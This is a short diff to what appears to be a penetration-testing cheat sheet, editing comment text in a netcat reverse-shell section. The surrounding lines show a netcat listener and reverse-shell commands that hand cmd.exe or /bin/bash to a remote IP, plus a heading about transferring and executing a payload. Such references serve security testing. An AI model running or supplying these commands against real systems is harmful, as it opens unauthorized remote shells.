@@ -418,12 +418,10 @@ sudo nc –lnvp {PORT}
 ```
 <br />
 
-# {IP ADDRESS}: IP Address of the client from step one (python server)
-
 ## NC Execute - Server [STEP 2]
 
 ```bash
-# With Netcat installed
+# With netcat installed
 
 # Usage - Windows
 nc.exe -e cmd.exe {IP ADDRESS} {PORT}
@@ -433,7 +431,7 @@ nc {IP ADDRESS} {PORT} –e /bin/bash
 
 # ===========================================
 
-# Without Netcat installed
+# Without netcat installed
 
 # Usage - transfer payload via file transfer and execute binary
 
